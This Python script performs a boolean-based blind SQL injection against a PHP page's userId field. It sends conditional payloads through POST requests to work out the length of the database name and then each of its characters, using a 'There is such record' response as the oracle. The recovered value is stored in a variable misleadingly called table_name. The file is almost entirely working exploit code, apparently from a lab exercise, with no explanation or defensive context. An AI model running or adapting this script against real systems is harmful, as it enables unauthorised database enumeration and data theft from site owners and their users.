#!/bin/python3


import requests

# Set the URL for the POST request
url = "http://WebServer/index2.php"


### Database length
key_word = "There is such record"
database_l = 0
for i in range(1,20) :
    payload = "2' AND 1=if(length(database())=" + str(i) + " ,1, 0)#"
    print(payload)
    data = {
        'userId': payload
    }

    # Make the POST request
    response = requests.post(url, data=data)

    # Check the response status code
    if response.status_code == 200:
        if key_word in response.text:
            print("Length of database is", i)
            database_l = i
            break;
    else:
        print(f"POST request failed with status code {response.status_code}")
        print("Error message:", response.text)


### Table_Name
table_name = []
key_word = "There is such record"
for i in range(1, database_l + 1) :
    for charxx in range(ord('a'), ord('z')+1):
        payload = "2' AND 1=if(substring(database(), " + str(i)  + ", 1)= " + "'" + chr(charxx) + "'" + " ,1, 0)#"
        print(payload)
        data = {
            'userId': payload
        }

        # Make the POST request
        response = requests.post(url, data=data)

        # Check the response status code
        if response.status_code == 200:
            if key_word in response.text:
                print("character at " + str(i) + " index is " + chr(charxx) )
                table_name.append(chr(charxx))
                break;
        else:
            print(f"POST request failed with status code {response.status_code}")
            print("Error message:", response.text)

print ( "Table name is : ", end='')
for j in range(0,len(table_name)):
    print ( table_name[j], end='')


### Request template
# # Data to be sent in the POST request (can be a dictionary, list of tuples, or raw data)
# data = {
#     'userId': '2'
# }

# # Make the POST request
# response = requests.post(url, data=data)

# # Check the response status code
# if response.status_code == 200:
#     print("POST request successful!")
#     print("Response content:", response.text)
# else:
#     print(f"POST request failed with status code {response.status_code}")
#     print("Error message:", response.text)
